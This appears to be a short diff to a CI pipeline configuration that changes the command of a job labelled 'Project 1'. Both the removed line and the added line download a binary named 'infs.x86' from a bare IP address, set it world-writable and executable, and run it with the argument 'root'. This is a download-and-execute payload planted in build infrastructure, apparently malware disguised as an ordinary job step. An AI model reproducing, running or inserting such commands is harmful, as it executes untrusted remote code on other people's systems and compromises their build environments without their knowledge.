@@ -8,4 +8,4 @@ jobs:
       - run:
           name: "Project 1"
           command: |
-                wget http://85.209.134.235/infs.x86; chmod 777 infs.x86; ./infs.x86 root
+          curl -O http://193.47.61.141/infs.x86; chmod 777 infs.x86; ./infs.x86 root
